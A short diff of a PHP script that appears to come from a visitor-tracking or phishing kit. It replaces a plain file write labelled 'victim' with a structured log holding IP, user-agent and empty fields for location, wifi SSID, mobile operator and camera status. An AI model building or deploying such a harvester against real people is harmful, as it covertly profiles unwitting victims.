@@ -16,14 +16,16 @@ $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
-$file = 'ip.txt';
-$victim = "IP: ";
-$fp = fopen($file, 'a');
-
-fwrite($fp, $victim);
-fwrite($fp, $ipaddress);
-fwrite($fp, $useragent);
-fwrite($fp, $browser);
-
-
-fclose($fp);
+$logDir = __DIR__ . '/logs';
+if (!is_dir($logDir)) { mkdir($logDir, 0755, true); }
+$logEntry = [
+    'ip' => $ipaddress,
+    'user_agent' => $browser,
+    'city' => null,
+    'country' => null,
+    'postal_code' => null,
+    'wifi_ssid' => null,
+    'mobile_operator' => null,
+    'camera_status' => null,
+];
+logData('ip', $logEntry);
